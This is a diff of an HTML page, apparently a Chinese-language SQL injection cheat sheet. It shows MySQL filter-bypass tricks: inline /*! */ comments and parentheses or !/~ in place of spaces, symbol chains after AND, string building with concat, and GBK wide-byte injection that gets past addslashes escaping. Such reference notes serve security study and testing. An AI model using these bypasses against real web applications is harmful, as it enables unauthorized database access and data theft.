@@ -334,10 +334,12 @@ mysql&gt; select * from user where user = <span class="keyword">char</span>(<spa
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params"><span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">//当有一参数为null返回null</span>
 mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">// 推荐使用</span>
 mysql&gt; <span class="function">SELECT <span class="title">GROUP_CONCAT</span>(<span class="params"><span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span></span>)</span>;
-</code></pre><h2 id="绕过空格">绕过空格</h2><pre><code>mysql&gt; /<span class="keyword">*</span>!select/<span class="keyword">*</span>!1/<span class="keyword">*</span>!<span class="keyword">*</span>/
-// /<span class="keyword">*</span>! SQL 语句 <span class="keyword">*</span>/ mysql特有语句，前面不管几个/<span class="keyword">*</span>!  语句需以<span class="keyword">*</span>/结尾.
-mysql&gt; select(1);
-//括号用来绕过过滤空格的情况.
+</code></pre><h2 id="绕过空格">绕过空格</h2><pre><code>mysql&gt; /*!<span class="keyword">select</span>/*!<span class="number">1</span>/*!*/
+<span class="comment">// /*! SQL 语句 */ mysql特有语句，前面不管几个/*!  语句需以*/结尾.</span>
+mysql&gt; <span class="keyword">select</span>(<span class="number">1</span>);
+<span class="comment">//括号用来绕过过滤空格的情况.</span>
+mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> admin <span class="built_in">where</span> username = <span class="string">"quan"</span><span class="built_in">and</span>!!<span class="number">1</span>=<span class="number">1</span>;
+<span class="comment">//在and/or之后使用 ！ ~ 代替空格如果注入参数是字符型则and前面的空格可以省略。</span>
 </code></pre><h2 id="and或or后面可以跟的字符">and或or后面可以跟的字符</h2><p><strong>符号: Space , + , - , ~ , ! , @ </strong></p>
 <pre><code>mysql&gt; SELECT <span class="number">1</span> FROM dual WHERE <span class="number">1</span>=<span class="number">1</span> AND-+-+-+-+~~((<span class="number">1</span>));
 </code></pre><h2 id="宽字节注入">宽字节注入</h2><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
